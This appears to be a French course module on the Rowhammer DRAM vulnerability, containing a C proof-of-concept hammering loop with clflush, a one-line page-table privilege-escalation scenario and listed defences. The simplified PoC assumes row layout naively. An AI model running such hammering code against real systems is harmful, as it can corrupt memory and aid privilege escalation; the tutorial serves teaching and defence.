# Module A13 : Rowhammer - Bit flips dans la RAM

## Objectifs pédagogiques

- Comprendre le phénomène Rowhammer
- Induire des bit flips dans la DRAM
- Exploiter Rowhammer pour l'élévation de privilèges
- Se défendre contre Rowhammer

## Introduction

**Rowhammer** est une vulnérabilité hardware de la DRAM. En accédant rapidement à certaines lignes mémoire, on peut provoquer des **bit flips** (changement de 0→1 ou 1→0) dans les lignes adjacentes.

```
┌────────────────────────────────────────────┐
│         Architecture DRAM                  │
└────────────────────────────────────────────┘

Bank
 ├─> Row 0  [0 0 0 0 0 0 0 0]
 ├─> Row 1  [1 1 1 1 1 1 1 1] ← Cible
 ├─> Row 2  [0 0 0 0 0 0 0 0]
 
Si on "hammer" Row 0 et Row 2 rapidement:
  → Interférence électrique
  → Row 1 peut flipper: [1 1 1 0 1 1 1 1]
```

## PoC Rowhammer

```c
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>

#define ROWS 1024
#define ROW_SIZE (8 * 1024)  // 8KB par row (hypothèse)

void clflush(void* addr) {
    asm volatile("clflush (%0)" :: "r"(addr));
}

int main() {
    // Allouer mémoire
    size_t size = ROWS * ROW_SIZE;
    uint8_t* mem = mmap(NULL, size, PROT_READ | PROT_WRITE, 
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    
    // Trouver 2 adresses sur des rows différentes
    uintptr_t row1 = (uintptr_t)mem;
    uintptr_t row2 = (uintptr_t)mem + (2 * ROW_SIZE);
    
    printf("Hammering...\n");
    for (int i = 0; i < 1000000; i++) {
        *(volatile uint64_t*)row1;
        *(volatile uint64_t*)row2;
        clflush((void*)row1);
        clflush((void*)row2);
    }
    
    // Vérifier bit flips
    uintptr_t victim = row1 + ROW_SIZE;
    for (int i = 0; i < ROW_SIZE; i++) {
        if (((uint8_t*)victim)[i] != 0) {
            printf("Bit flip détecté à offset %d!\n", i);
        }
    }
    
    munmap(mem, size);
    return 0;
}
```

## Exploitation

**Scénario :** Flipper un bit dans une page table pour obtenir accès à une page kernel.

## Résumé

- Rowhammer = bit flips dans DRAM via accès rapides
- Exploitable pour élévation de privilèges (flip page table)
- Défense : ECC RAM, refresh plus fréquent, TRR (Target Row Refresh)

## Ressources

- **Project Zero Rowhammer** : https://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html
- **Rowhammer.js** : https://github.com/IAIK/rowhammerjs

---

**Module suivant** : [Hardware Implants](../04-Hardware-Implants/)
